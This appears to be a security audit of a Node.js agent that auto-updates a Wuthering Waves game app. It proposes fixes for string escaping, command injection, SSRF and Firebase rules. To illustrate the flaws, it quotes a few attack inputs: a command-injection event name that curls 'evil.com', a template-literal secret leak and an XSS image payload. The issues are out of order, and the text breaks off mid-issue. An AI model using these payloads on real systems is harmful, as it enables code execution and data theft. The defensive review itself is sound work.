## Issue 7: `escapeSingleQuote` Is Insufficient — Code Injection in Writer

**File:** `agent/lib/writer.js`, line 249  
**Severity:** CRITICAL

**Problem:** The `escapeSingleQuote` function only escapes `'` to `\'`. But writer functions like `addCharacterEntry` (line 167), `addWeaponEntry` (line 196), and `addNewEvent` in `new-events.js` inject AI-extracted strings directly into JavaScript source code using template literals. A malicious or malformed string containing **backslashes, newlines, or template literal syntax** can break out of the string context and inject arbitrary JavaScript into `appcore-data.js`, which is loaded by the app.

Example: a character description like `Hello\nworld` would produce a literal newline in the JS source, breaking the string. Or `${process.env.SECRET}` in a template literal context.

**Fix:** Replace with a comprehensive JS string escaper.

```javascript
// agent/lib/writer.js — replace escapeSingleQuote function

/**
 * Escape a string for safe insertion into a single-quoted JavaScript string literal.
 * Handles all characters that could break the string context or inject code.
 */
function escapeForJSString(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/\\/g, '\\\\')     // Backslashes first (before adding more)
    .replace(/'/g, "\\'")        // Single quotes
    .replace(/\n/g, '\\n')      // Newlines
    .replace(/\r/g, '\\r')      // Carriage returns
    .replace(/\t/g, '\\t')      // Tabs
    .replace(/\0/g, '\\0')      // Null bytes
    .replace(/\u2028/g, '\\u2028') // Line separator
    .replace(/\u2029/g, '\\u2029') // Paragraph separator
    .replace(/\$/g, '\\$');     // Dollar signs (prevent template literal injection)
}

// BACKWARD COMPAT: keep old name as alias but use the safe version
function escapeSingleQuote(str) {
  return escapeForJSString(str);
}
```

Then audit every place strings are injected. For example, in `addCharacterEntry` (line 167):

```javascript
// agent/lib/writer.js — in addCharacterEntry, replace the entry template

  const entry = `  '${escapeForJSString(name)}': { rarity: ${data.rarity}, element: '${escapeForJSString(data.element)}', weapon: '${escapeForJSString(data.weapon)}', role: '${escapeForJSString(data.role)}',
    desc: '${escapeForJSString(data.desc || '')}',
    skills: [${skills}],
    ascension: { boss: '${escapeForJSString(data.ascension?.boss || 'TBD')}', common: '${escapeForJSString(data.ascension?.common || 'TBD')}', specialty: '${escapeForJSString(data.ascension?.specialty || 'TBD')}' },
    skillMaterials: { weeklyDrop: '${escapeForJSString(data.skillMaterials?.weeklyDrop || 'TBD')}', forgery: '${escapeForJSString(data.skillMaterials?.forgery || 'TBD')}' },
    bestEchoes: [${bestEchoes}], bestWeapon: '${escapeForJSString(data.bestWeapon || 'TBD')}',
    teams: [${teams}] },\n`;
```

Apply the same `escapeForJSString` pattern to `addWeaponEntry` and `new-events.js:addNewEvent`.

## Issue 8: `addCharacterEntry` and `addWeaponEntry` Don't Validate Enum Fields

**File:** `agent/lib/writer.js`, lines 150-209  
**Severity:** HIGH

**Problem:** When adding a new character or weapon, the writer accepts whatever `data.element`, `data.weapon`, `data.role`, etc. values come from the AI. If Claude hallucinates a value like `element: 'Lightning'` (not a valid WuWa element), it's written directly to the source file. This will cause runtime errors in the app when the element doesn't match any switch/case or color map.

**Fix:** Add enum validation before writing.

```javascript
// agent/lib/writer.js — add after imports

import { GAME } from './config.js';

function validateEnum(value, allowedValues, fieldName) {
  if (!allowedValues.includes(value)) {
    throw new Error(
      `Invalid ${fieldName}: "${value}". Must be one of: ${allowedValues.join(', ')}`
    );
  }
  return value;
}

// Then in addCharacterEntry, before building the entry string:
export function addCharacterEntry(name, data) {
  // Validate required enums
  validateEnum(data.element, GAME.ELEMENTS, 'element');
  validateEnum(data.weapon, GAME.WEAPON_TYPES, 'weapon type');
  validateEnum(data.role, GAME.ROLES, 'role');
  if (![4, 5].includes(data.rarity)) {
    throw new Error(`Invalid rarity: ${data.rarity}. Must be 4 or 5.`);
  }

  // ... rest of function unchanged

// And in addWeaponEntry:
export function addWeaponEntry(name, data) {
  validateEnum(data.type, GAME.WEAPON_TYPES, 'weapon type');
  if (![4, 5].includes(data.rarity)) {
    throw new Error(`Invalid rarity: ${data.rarity}. Must be 4 or 5.`);
  }

  // ... rest of function unchanged
```

## Issue 9: `bumpVersion` Doesn't Validate Version Format

**File:** `agent/lib/writer.js`, lines 42-67  
**Severity:** MEDIUM

**Problem:** `bumpVersion` splits on `.` and increments `parts[2]`, but if the version string is malformed (e.g., `1.0`, missing patch), `parts[2]` is `undefined`, and `parseInt(undefined)` returns `NaN`, producing version `1.0.NaN`. The sw.js update also uses a simple string replace that could match unintended locations.

**Fix:**

```javascript
// agent/lib/writer.js — replace bumpVersion

export function bumpVersion(currentVersion) {
  // Validate semver-like format
  const parts = currentVersion.split('.');
  if (parts.length < 2 || parts.length > 3) {
    throw new Error(`Invalid version format: "${currentVersion}". Expected X.Y or X.Y.Z`);
  }
  
  // Ensure all parts are valid numbers
  const major = parseInt(parts[0], 10);
  const minor = parseInt(parts[1], 10);
  const patch = parseInt(parts[2] || '0', 10);
  
  if (isNaN(major) || isNaN(minor) || isNaN(patch)) {
    throw new Error(`Version contains non-numeric parts: "${currentVersion}"`);
  }

  const newVersion = `${major}.${minor}.${patch + 1}`;

  safeReplace(
    `const APP_VERSION = '${currentVersion}';`,
    `const APP_VERSION = '${newVersion}';`,
    `Bump version ${currentVersion} → ${newVersion}`
  );

  // ... rest unchanged (package.json and sw.js updates)
```

## Issue 10: Source Monitor Memory Grows Unbounded for New Domains

**File:** `agent/lib/source-monitor.js`, lines 101-119  
**Severity:** MEDIUM

**Problem:** `recordScrapeResult` creates a new `memory.sourceHealth[domain]` entry for every unique domain encountered. If the agent ever fetches from user-influenced URLs (e.g., wiki pages constructed from character names), the memory object could grow unbounded. Combined with MAX_HISTORY_PER_DOMAIN of 30 records each, this could bloat `.memory.json`.

**Fix:** Add a domain count cap.

```javascript
// agent/lib/source-monitor.js — add at top of recordScrapeResult, after ensureStructure

const MAX_TRACKED_DOMAINS = 50;

export function recordScrapeResult(memory, url, result) {
  ensureStructure(memory);
  const domain = getDomain(url);

  if (!memory.sourceHealth[domain]) {
    // Cap total tracked domains to prevent memory bloat
    const domains = Object.keys(memory.sourceHealth);
    if (domains.length >= MAX_TRACKED_DOMAINS) {
      // Evict the domain with the oldest lastSeen
      let oldestDomain = domains[0];
      let oldestTime = Infinity;
      for (const d of domains) {
        const seen = memory.sourceHealth[d].lastSeen
          ? new Date(memory.sourceHealth[d].lastSeen).getTime()
          : 0;
        if (seen < oldestTime) { oldestTime = seen; oldestDomain = d; }
      }
      delete memory.sourceHealth[oldestDomain];
      log.dim(`Evicted stale source health entry: ${oldestDomain}`);
    }

    memory.sourceHealth[domain] = {
      history: [],
      avgContentLength: 0,
      consecutiveFailures: 0,
      lastSeen: null,
      lastOk: null,
      totalFetches: 0,
      totalOk: 0,
    };
  }
  // ... rest unchanged
```

## Issue 11: `shouldTrustSource` Calls Itself Repeatedly in `getSourceReport`

**File:** `agent/lib/source-monitor.js`, lines 223-246  
**Severity:** MEDIUM (Performance)

**Problem:** In `getSourceReport`, `shouldTrustSource` is called **once** per domain in the main loop (line 229), then again for all problem domains (line 241 filter), then **again** for each problem domain (line 243). For N domains with M problems, that's N + N + M calls instead of N. Each call iterates the last 10 history records and computes multiple factors.

**Fix:** Cache results.

```javascript
// agent/lib/source-monitor.js — replace getSourceReport

export function getSourceReport(memory) {
  ensureStructure(memory);
  const domains = Object.keys(memory.sourceHealth);

  if (domains.length === 0) {
    return '## Source Health\n\n*No source data tracked yet.*\n';
  }

  // Pre-compute trust scores once per domain
  const trustCache = new Map();
  for (const domain of domains) {
    trustCache.set(domain, shouldTrustSource(memory, domain));
  }

  const lines = ['## Source Health\n'];
  lines.push('| Domain | Status | Success Rate | Avg Size | Consec. Fails | Last OK |');
  lines.push('|--------|--------|-------------|----------|---------------|---------|');

  for (const domain of domains.sort()) {
    const entry = memory.sourceHealth[domain];
    const trust = trustCache.get(domain);

    const status = trust.score >= 0.8 ? '✅ Healthy'
      : trust.score >= 0.5 ? '⚠️ Degraded' : '❌ Dead';

    const rate = entry.totalFetches > 0
      ? `${((entry.totalOk / entry.totalFetches) * 100).toFixed(0)}% (${entry.totalOk}/${entry.totalFetches})`
      : 'N/A';

    const avgSize = entry.avgContentLength > 0
      ? `${(entry.avgContentLength / 1024).toFixed(1)}KB` : 'N/A';

    const lastOk = entry.lastOk ? entry.lastOk.slice(0, 10) : 'never';

    lines.push(`| ${domain} | ${status} | ${rate} | ${avgSize} | ${entry.consecutiveFailures} | ${lastOk} |`);
  }

  const problems = domains.filter(d => trustCache.get(d).score < 0.8);
  if (problems.length > 0) {
    lines.push('\n### Issues\n');
    for (const d of problems) {
      lines.push(`- **${d}**: ${trustCache.get(d).reason}`);
    }
  }

  return lines.join('\n') + '\n';
}
```

## Issue 13: `extractJSON` Regex Can Match Across Unrelated JSON Blocks

**File:** `agent/lib/ai.js`, lines 49-58  
**Severity:** MEDIUM

**Problem:** The fallback strategy at lines 53-58 finds the FIRST `{` or `[` and the LAST `}` or `]` in the entire response. If Claude's response contains multiple JSON objects (e.g., an explanation with an example followed by the actual answer), this would try to parse from the first example `{` to the last answer `}`, creating invalid JSON that includes text between the two objects.

**Fix:** Try multiple JSON extraction strategies, preferring the last complete JSON block.

```javascript
// agent/lib/ai.js — replace extractJSON

function extractJSON(text) {
  // Strategy 1: Direct parse
  try { return JSON.parse(text.trim()); } catch {}

  // Strategy 2: Extract from code fence (prefer the last one if multiple)
  const fenceMatches = [...text.matchAll(/```(?:json)?\s*([\s\S]*?)```/g)];
  for (let i = fenceMatches.length - 1; i >= 0; i--) {
    try { return JSON.parse(fenceMatches[i][1].trim()); } catch {}
  }

  // Strategy 3: Find balanced JSON blocks — try the LAST one first
  //   (Claude often puts the real answer last)
  const jsonBlocks = findBalancedJsonBlocks(text);
  for (let i = jsonBlocks.length - 1; i >= 0; i--) {
    try { return JSON.parse(jsonBlocks[i]); } catch {}
  }

  // Strategy 4: Original first-to-last fallback (least reliable)
  const jsonStart = text.search(/[\[{]/);
  const jsonEndBrace = text.lastIndexOf('}');
  const jsonEndBracket = text.lastIndexOf(']');
  const jsonEnd = Math.max(jsonEndBrace, jsonEndBracket);
  if (jsonStart >= 0 && jsonEnd > jsonStart) {
    try { return JSON.parse(text.slice(jsonStart, jsonEnd + 1)); } catch {}
  }

  throw new Error('Could not extract valid JSON from AI response');
}

/**
 * Find balanced JSON blocks ({...} or [...]) in a string.
 */
function findBalancedJsonBlocks(text) {
  const blocks = [];
  for (let i = 0; i < text.length; i++) {
    if (text[i] === '{' || text[i] === '[') {
      const close = text[i] === '{' ? '}' : ']';
      let depth = 1;
      let inString = false;
      let escape = false;
      for (let j = i + 1; j < text.length && depth > 0; j++) {
        if (escape) { escape = false; continue; }
        if (text[j] === '\\') { escape = true; continue; }
        if (text[j] === '"') { inString = !inString; continue; }
        if (inString) continue;
        if (text[j] === text[i]) depth++;
        if (text[j] === close) depth--;
        if (depth === 0) {
          blocks.push(text.slice(i, j + 1));
          i = j; // Skip ahead
        }
      }
    }
  }
  return blocks;
}
```

## Issue 14: Image Upload Sends URL as Form Body — Possible SSRF

**File:** `agent/lib/images.js`, lines 26-51  
**Severity:** HIGH

**Problem:** `uploadToImgbb` accepts a `imageSource` URL and sends it to imgbb's API, which fetches the image from that URL server-side. This is essentially a **server-side request forgery proxy**: if an attacker can influence the `imageSource` value (via crafted wiki pages → Claude extraction), they can make imgbb's servers fetch from internal/private URLs. While imgbb's servers aren't *our* servers, this could be abused to probe or interact with internal services if the image URL is from a local/private IP range.

**Fix:** Validate that image URLs point to expected public image hosts.

```javascript
// agent/lib/images.js — add after imports

const ALLOWED_IMAGE_HOSTS = [
  'static.wikia.nocookie.net',
  'images.wikia.nocookie.net',
  'wutheringwaves.fandom.com',
  'prydwen.gg',
  'cdn.prydwen.gg',
  'game8.co',
  'img.game8.co',
  'i.ibb.co',
  'wuwa.gg',
];

function isAllowedImageUrl(url) {
  try {
    const parsed = new URL(url);
    // Block private/local IPs
    if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|0\.|localhost|::1|\[::1\])/i.test(parsed.hostname)) {
      return false;
    }
    // Must be HTTPS
    if (parsed.protocol !== 'https:') return false;
    // Must be a known image host
    return ALLOWED_IMAGE_HOSTS.some(h => parsed.hostname === h || parsed.hostname.endsWith('.' + h));
  } catch {
    return false;
  }
}

// Then at the start of uploadToImgbb:
export async function uploadToImgbb(imageSource, name, { isUrl = true } = {}) {
  if (isUrl && !isAllowedImageUrl(imageSource)) {
    log.warn(`Blocked image upload from non-allowed host: ${imageSource}`);
    return null;
  }
  // ... rest unchanged
```

## Issue 15: `cross-verify.js` Has No Timeout on Per-Source Extraction

**File:** `agent/lib/cross-verify.js`, lines 73-96  
**Severity:** MEDIUM

**Problem:** `extractPerSource` calls `askClaudeFn` in a sequential loop for each source. If one call hangs (API timeout, rate limit), the entire cross-verification pipeline blocks indefinitely. There's no per-call timeout beyond what `askClaude` provides internally.

Additionally, the `JSON.parse` at line 88 runs without the `extractJSON` helper, missing all the fallback strategies.

**Fix:**

```javascript
// agent/lib/cross-verify.js — replace extractPerSource

export async function extractPerSource(sources, extractionPrompt, askClaudeFn, { extractJSONFn = null, timeoutMs = 30000 } = {}) {
  const results = [];

  for (const source of sources) {
    const domain = getDomain(source.url);
    const prompt = extractionPrompt.replace('{SOURCE_CONTENT}', source.content.slice(0, 20000));

    try {
      // Wrap in a timeout
      const response = await Promise.race([
        askClaudeFn(
          'Extract game data from this single source. Return only valid JSON. If data is unclear or not found, use null.',
          prompt,
          { maxTokens: 2048 }
        ),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Extraction timed out')), timeoutMs))
      ]);

      // Use extractJSON if available, fallback to basic parse
      let data;
      if (extractJSONFn) {
        data = extractJSONFn(response);
      } else {
        data = JSON.parse(response.replace(/```json?\n?/g, '').replace(/```/g, '').trim());
      }
      
      results.push({ source: domain, data, url: source.url });
    } catch (err) {
      log.dim(`Extraction failed for ${domain}: ${err.message}`);
      results.push({ source: domain, data: {}, url: source.url });
    }
  }

  return results;
}
```

## Issue 16: `meta-refresh.js` Regex Matching Is Greedy — Can Match Wrong Character

**File:** `agent/lib/meta-refresh.js`, lines 112-127  
**Severity:** HIGH

**Problem:** In `applyMetaUpdates`, the regex patterns like:
```javascript
new RegExp(`('${escaped}':[\\s\\S]*?bestWeapon:\\s*)'[^']*'`)
```
use `[\s\S]*?` (lazy) to match from the character name to `bestWeapon`. But if two characters have similar names or the pattern is common, `[\s\S]*?` can still match across character entries. For example, if Character A's entry appears before Character B, and we search for B's `bestWeapon`, the regex might match starting from B's name but — due to how lazy quantifiers work with the overall match — could potentially find the wrong `bestWeapon` if character entries have different structures.

More importantly: `buf.replace(match[0], ...)` only replaces the first occurrence, but `match` was found via `.match()` which also returns the first occurrence. If the character name appears elsewhere (like in a `teams` array of another character), the match starting point could be wrong.

**Fix:** Use more specific regex anchoring.

```javascript
// agent/lib/meta-refresh.js — replace the applyMetaUpdates field matching logic

export function applyMetaUpdates(updates, getBufferFn, loadBufferFn, memory, minConfidence = 0.85) {
  let changed = false;

  for (const update of updates) {
    if (update.confidence < minConfidence) {
      log.dim(`Skipped ${update.name}.${update.field} — confidence ${(update.confidence * 100).toFixed(0)}% < ${(minConfidence * 100).toFixed(0)}%`);
      continue;
    }

    let buf = getBufferFn();
    const escaped = update.name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

    // Find the character's entry block boundaries first
    // Character entries look like: 'Name': { ... },\n  'NextName':
    const blockPattern = new RegExp(`'${escaped}':\\s*\\{([\\s\\S]*?)\\}\\s*,\\s*\\n`);
    const blockMatch = buf.match(blockPattern);
    if (!blockMatch) {
      log.warn(`Could not find CHARACTER_DATA block for ${update.name}`);
      continue;
    }

    const blockStart = blockMatch.index;
    const blockEnd = blockStart + blockMatch[0].length;
    const blockContent = blockMatch[0];

    if (update.field === 'bestWeapon' && typeof update.newValue === 'string') {
      const fieldPattern = /bestWeapon:\s*'[^']*'/;
      const fieldMatch = blockContent.match(fieldPattern);
      if (fieldMatch) {
        const newBlock = blockContent.replace(fieldPattern, `bestWeapon: '${update.newValue}'`);
        buf = buf.slice(0, blockStart) + newBlock + buf.slice(blockEnd);
        loadBufferFn(buf);
        addChange('meta-refresh', `${update.name} bestWeapon → ${update.newValue}`);
        changed = true;
      }
    }

    if (update.field === 'bestEchoes' && Array.isArray(update.newValue)) {
      const fieldPattern = /bestEchoes:\s*\[[^\]]*\]/;
      const fieldMatch = blockContent.match(fieldPattern);
      if (fieldMatch) {
        const newArr = `bestEchoes: [${update.newValue.map(e => `'${e}'`).join(', ')}]`;
        const newBlock = blockContent.replace(fieldPattern, newArr);
        buf = buf.slice(0, blockStart) + newBlock + buf.slice(blockEnd);
        loadBufferFn(buf);
        addChange('meta-refresh', `${update.name} bestEchoes updated`);
        changed = true;
      }
    }

    if (update.field === 'teams' && Array.isArray(update.newValue)) {
      const fieldPattern = /teams:\s*\[[^\]]*\]/;
      const fieldMatch = blockContent.match(fieldPattern);
      if (fieldMatch) {
        const newArr = `teams: [${update.newValue.map(t => `'${t}'`).join(', ')}]`;
        const newBlock = blockContent.replace(fieldPattern, newArr);
        buf = buf.slice(0, blockStart) + newBlock + buf.slice(blockEnd);
        loadBufferFn(buf);
        addChange('meta-refresh', `${update.name} teams updated`);
        changed = true;
      }
    }
  }

  return changed;
}
```

## Issue 17: `standard-pool.js` Uses Comma-Prepending That Creates Invalid JS

**File:** `agent/lib/standard-pool.js`, lines 81-89  
**Severity:** HIGH

**Problem:** When adding to `STANDARD_5STAR_CHARACTERS`, the code does:
```javascript
buf = buf.replace(setMatch[0], `${setMatch[1]}, '${name}'${setMatch[2]}`);
```
This prepends `, ` before the new name, which works if there are existing entries. But the regex `(const STANDARD_5STAR_CHARACTERS = new Set\(\[[\s\S]*?)` captures everything including trailing whitespace. If the Set is empty (`new Set([])`), this produces `new Set([, 'Name'])` — a syntax error (leading comma creates an empty slot).

Similarly, for `standardCharacters` on line 94, same issue.

**Fix:**

```javascript
// agent/lib/standard-pool.js — replace the character addition block (lines 78-97)

  if (analysis.newStandardChars?.length) {
    for (const name of analysis.newStandardChars) {
      const escapedName = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

      // Add to STANDARD_5STAR_CHARACTERS Set
      const setMatch = buf.match(/(const STANDARD_5STAR_CHARACTERS = new Set\(\[)([\s\S]*?)(]\))/);
      if (setMatch && !setMatch[2].includes(`'${name}'`)) {
        const existingContent = setMatch[2].trim();
        const separator = existingContent.length > 0 ? ', ' : '';
        buf = buf.replace(setMatch[0], `${setMatch[1]}${setMatch[2]}${separator}'${name}'${setMatch[3]}`);
        addChange('standard-pool', `Added ${name} to STANDARD_5STAR_CHARACTERS`);
        changed = true;
      }

      // Add to CURRENT_BANNERS.standardCharacters
      const stdCharsMatch = buf.match(/(standardCharacters:\s*\[)([\s\S]*?)(])/);
      if (stdCharsMatch && !stdCharsMatch[2].includes(`'${name}'`)) {
        const existingContent = stdCharsMatch[2].trim();
        const separator = existingContent.length > 0 ? ', ' : '';
        buf = buf.replace(stdCharsMatch[0], `${stdCharsMatch[1]}${stdCharsMatch[2]}${separator}'${name}'${stdCharsMatch[3]}`);
        changed = true;
      }
    }
  }
```

Apply the same fix to the weapons section (lines 99-113).

## Issue 19: Skills Loader Caches Indefinitely — Stale During Long Runs

**File:** `agent/lib/skills.js`, lines 115-146  
**Severity:** LOW

**Problem:** `loadSkills()` uses a module-level `_cache` that persists for the entire process lifetime. If the agent runs as a long-lived process (rather than a per-run script), skill files changed on disk won't be picked up. This is a minor issue since the agent currently runs as a one-shot script, but the comment says "only reads files once per agent run" which may not hold if the process model changes.

**Fix:** Add a cache invalidation mechanism.

```javascript
// agent/lib/skills.js — replace cache logic

let _cache = null;
let _cacheTimestamp = 0;
const CACHE_TTL_MS = 300_000; // 5 minutes

export function loadSkills({ force = false } = {}) {
  const now = Date.now();
  if (_cache && !force && (now - _cacheTimestamp) < CACHE_TTL_MS) {
    return _cache;
  }

  log.info('Loading audit skills...');
  // ... rest of function unchanged, just add at the end before return:
  _cacheTimestamp = now;
  
  return _cache;
}

/** Force cache refresh on next call */
export function invalidateSkillsCache() {
  _cache = null;
  _cacheTimestamp = 0;
}
```

## Issue 1: Command Injection via Unsanitized `summary` in Git Commit

**File:** `agent/lib/git.js`, lines 80–84  
**Severity:** CRITICAL

The `commitChanges` function interpolates `summary` and change log content directly into a shell command string. The simple `replace(/"/g, '\\"')` escape is trivially bypassed with backticks, `$(...)`, `\n`, or single quotes, enabling arbitrary command execution. Change log descriptions originate from AI-analyzed external data (banner names, event titles, character names), which are attacker-influenced.

```javascript
// VULNERABLE:
exec(`git commit -m "${message.replace(/"/g, '\\"')}"`);
```

An event named `Test$(curl evil.com/pwn)` or `Test\`id\`` would execute in the shell.

**Fix:** Use `execFileSync` which passes arguments as an array, avoiding shell interpolation entirely.

```javascript
// agent/lib/git.js — COMPLETE CORRECTED FILE

import { execSync, execFileSync } from 'child_process';
import { PATHS, GIT } from './config.js';
import { log, getChangeLog } from './log.js';

const exec = (cmd) => execSync(cmd, { cwd: PATHS.repoRoot, encoding: 'utf-8', stdio: 'pipe' }).trim();

/**
 * Run git with arguments as an array (no shell interpolation).
 */
const execGitSafe = (...args) => execFileSync('git', args, { cwd: PATHS.repoRoot, encoding: 'utf-8', stdio: 'pipe' }).trim();

/**
 * Check if git is available and repo is clean-ish.
 */
export function checkGitStatus() {
  try {
    exec('git status --short');
    return true;
  } catch {
    log.warn('Git not available or not in a git repo');
    return false;
  }
}

/**
 * Configure git author for the agent.
 */
export function configureGit() {
  try {
    execGitSafe('config', 'user.name', GIT.authorName);
    execGitSafe('config', 'user.email', GIT.authorEmail);
    log.ok(`Git configured: ${GIT.authorName} <${GIT.authorEmail}>`);
  } catch (err) {
    log.warn(`Could not configure git: ${err.message}`);
  }
}

/**
 * Create and checkout a new branch for this update.
 * Branch name format: auto-update/YYYY-MM-DD-HHMMSS
 */
export function createBranch() {
  const now = new Date();
  const stamp = now.toISOString().replace(/[:-]/g, '').replace('T', '-').slice(0, 15);
  // Sanitize branch name to only allow safe characters
  const safeBranchPrefix = GIT.branchPrefix.replace(/[^a-zA-Z0-9\-_\/]/g, '');
  const branch = `${safeBranchPrefix}${stamp}`;

  try {
    execGitSafe('checkout', '-b', branch);
    log.ok(`Created branch: ${branch}`);
    return branch;
  } catch (err) {
    log.error(`Failed to create branch: ${err.message}`);
    return null;
  }
}

/**
 * Stage and commit all changes.
 * Returns the commit hash or null on failure.
 */
export function commitChanges(summary) {
  try {
    // Stage the specific files we modify
    execGitSafe('add', 'whispering-wishes-replit/src/appcore-data.js');
    execGitSafe('add', 'whispering-wishes-replit/package.json');
    execGitSafe('add', 'whispering-wishes-replit/public/sw.js');

    // Check if there's anything to commit
    const status = exec('git status --short');
    if (!status) {
      log.info('No changes to commit');
      return null;
    }

    // Build commit message from change log
    const changes = getChangeLog();
    const changeLines = changes.map(c => `  - [${c.category}] ${c.description} (${c.confidence})`).join('\n');

    const message = `${GIT.commitPrefix} ${summary}\n\nChanges:\n${changeLines}\n\nGenerated by WW Update Agent at ${new Date().toISOString()}`;

    // SAFE: pass message as argument array element, no shell interpretation
    execGitSafe('commit', '-m', message);

    const hash = execGitSafe('rev-parse', '--short', 'HEAD');
    log.ok(`Committed: ${hash} — ${summary}`);
    return hash;
  } catch (err) {
    log.error(`Commit failed: ${err.message}`);
    return null;
  }
}

/**
 * Push the current branch to origin.
 */
export function pushBranch(branch) {
  try {
    execGitSafe('push', 'origin', branch);
    log.ok(`Pushed branch: ${branch}`);
    return true;
  } catch (err) {
    log.error(`Push failed: ${err.message}`);
    return false;
  }
}

/**
 * Full git workflow: branch → commit → push
 */
export function gitPublish(summary) {
  if (!checkGitStatus()) return { branch: null, commit: null, pushed: false };

  configureGit();
  const branch = createBranch();
  if (!branch) return { branch: null, commit: null, pushed: false };

  const commit = commitChanges(summary);
  if (!commit) return { branch, commit: null, pushed: false };

  const pushed = pushBranch(branch);
  return { branch, commit, pushed };
}
```

## Issue 2: Command Injection in PR Cleanup via `execSync` Shell Strings

**File:** `agent/lib/pr-cleanup.js`, lines 31–33, 42–45  
**Severity:** MEDIUM

While the commands here are hardcoded strings (no user input interpolation), the pattern uses `execSync` with shell interpretation. The PR number `pr.number` is interpolated into a shell command on line 42. If the GitHub API returned a malicious `number` value (unlikely but defense-in-depth), this is injectable.

```javascript
// CURRENT (line 42-44):
execSync(
  `gh pr close ${pr.number} --comment "Superseded by newer auto-update. Closing stale PR."`,
  ...
);
```

**Fix:** Use `execFileSync` for the command that interpolates `pr.number`, and validate the PR number is actually numeric.

```javascript
// agent/lib/pr-cleanup.js — COMPLETE CORRECTED FILE

import { execSync, execFileSync } from 'child_process';
import { PATHS } from './config.js';
import { log } from './log.js';

/**
 * Close all open PRs created by the agent (matching the auto-update label).
 * Called before creating a new PR.
 */
export function closeStalePRs() {
  if (!process.env.GITHUB_TOKEN && !process.env.GH_TOKEN) {
    log.dim('No GitHub token — skipping stale PR cleanup');
    return 0;
  }

  try {
    // List open PRs with auto-update label
    const result = execFileSync('gh', [
      'pr', 'list',
      '--label', 'auto-update',
      '--state', 'open',
      '--json', 'number,title,createdAt',
      '--limit', '20'
    ], { cwd: PATHS.repoRoot, encoding: 'utf-8', stdio: 'pipe', timeout: 15000 }).trim();

    if (!result || result === '[]') {
      log.dim('No stale auto-update PRs found');
      return 0;
    }

    const prs = JSON.parse(result);
    let closed = 0;

    for (const pr of prs) {
      // Validate PR number is actually a positive integer
      const prNumber = Number(pr.number);
      if (!Number.isInteger(prNumber) || prNumber <= 0) {
        log.warn(`Invalid PR number: ${pr.number} — skipping`);
        continue;
      }

      const ageHours = (Date.now() - new Date(pr.createdAt).getTime()) / 3600000;

      // Close PRs older than 12 hours — they're stale
      if (ageHours > 12) {
        try {
          execFileSync('gh', [
            'pr', 'close', String(prNumber),
            '--comment', 'Superseded by newer auto-update. Closing stale PR.'
          ], { cwd: PATHS.repoRoot, encoding: 'utf-8', stdio: 'pipe', timeout: 10000 });
          log.ok(`Closed stale PR #${prNumber}: ${pr.title} (${ageHours.toFixed(0)}h old)`);
          closed++;
        } catch (err) {
          log.warn(`Could not close PR #${prNumber}: ${err.message}`);
        }
      }
    }

    if (closed) log.ok(`Closed ${closed} stale PR(s)`);
    return closed;
  } catch (err) {
    log.dim(`PR cleanup skipped: ${err.message}`);
    return 0;
  }
}
```

## Issue 3: Firebase Database Rules — Missing Auth UID Binding

**File:** `whispering-wishes-replit/database.rules.json`, lines 5–6, 19–20  
**Severity:** HIGH

The `leaderboard` and `community-pulls` write rules allow `auth != null` under `$uid`, but never verify that `$uid === auth.uid`. This means **any authenticated user can overwrite any other user's leaderboard entry or community pulls data**. The only constraint is the 10-second rate limit, but that's per-key, not per-user.

```json
// CURRENT (leaderboard):
"$uid": {
  ".write": "auth != null && (!data.exists() || data.child('timestamp').val() + 10000 < now)",
```

**Fix:** Bind `$uid` to the authenticated user's UID:

```json
{
  "rules": {
    "leaderboard": {
      ".read": "auth != null",
      "$uid": {
        ".write": "auth != null && auth.uid === $uid && (!data.exists() || data.child('timestamp').val() + 10000 < now)",
        ".validate": "newData.hasChildren(['id', 'avgPity', 'pulls', 'totalPulls', 'timestamp'])
                      && newData.child('avgPity').isNumber()
                      && newData.child('avgPity').val() >= 1
                      && newData.child('avgPity').val() <= 80
                      && newData.child('pulls').isNumber()
                      && newData.child('pulls').val() >= 0
                      && newData.child('pulls').val() <= 9999
                      && newData.child('totalPulls').isNumber()
                      && newData.child('totalPulls').val() >= 0
                      && newData.child('totalPulls').val() <= 999999
                      && newData.child('timestamp').isNumber()
                      && newData.child('timestamp').val() <= now + 60000
                      && newData.child('id').isString()
                      && newData.child('id').val().length <= 64"
      }
    },
    "community-pulls": {
      ".read": "auth != null",
      "$uid": {
        ".write": "auth != null && auth.uid === $uid && (!data.exists() || data.child('timestamp').val() + 10000 < now)",
        ".validate": "newData.hasChildren(['timestamp'])
                      && newData.child('timestamp').isNumber()
                      && newData.child('timestamp').val() <= now + 60000"
      }
    },
    "presence": {
      ".read": "auth != null",
      "$sessionId": {
        ".write": "auth != null",
        ".validate": "newData.hasChildren(['t'])
                      && newData.child('t').isNumber()
                      && newData.child('t').val() <= now + 60000"
      }
    },
    "$other": {
      ".read": false,
      ".write": false
    }
  }
}
```

**⚠️ Frontend Agent Note:** If the frontend writes to `/leaderboard/<someKey>` where `<someKey>` is not `auth.uid`, those writes will now be rejected. Verify the frontend uses `auth.currentUser.uid` as the key for leaderboard and community-pulls writes.

## Issue 4: Firebase `presence` Rules — No UID Binding and Unlimited Write

**File:** `whispering-wishes-replit/database.rules.json`, lines 27–32  
**Severity:** MEDIUM

The `presence` node allows any authenticated user to write to any `$sessionId` with no ownership check and no rate limiting. A malicious authenticated user could:
1. Flood the presence node with thousands of entries
2. Overwrite other users' presence data

**Fix:** Bind session ownership to UID and add a size constraint:

```json

      ".read": "auth != null",
      "$sessionId": {
        ".write": "auth != null && $sessionId.beginsWith(auth.uid)",
        ".validate": "newData.hasChildren(['t'])
                      && newData.child('t').isNumber()
                      && newData.child('t').val() <= now + 60000
                      && newData.child('t').val() >= now - 300000"
      }
    },
```

**⚠️ Frontend Agent Note:** The frontend must format the session ID as `${auth.uid}_${sessionSuffix}` (e.g., `${uid}_${Date.now()}`). Verify and update the presence write logic accordingly.

## Issue 5: Leaderboard `id` Field Has No Content Validation — XSS Vector

**File:** `whispering-wishes-replit/database.rules.json`, lines 8–16  
**Severity:** HIGH

The leaderboard entry's `id` field is validated only as `isString()` with `length <= 64`. This is a user-controlled display name that gets read and presumably rendered in the frontend. An attacker can store `<img src=x onerror=alert(1)>` or `<script>` tags as their `id`, which is 35 characters and passes the 64-character check.

Firebase rules cannot do regex/content validation, so the fix must be defense-in-depth:
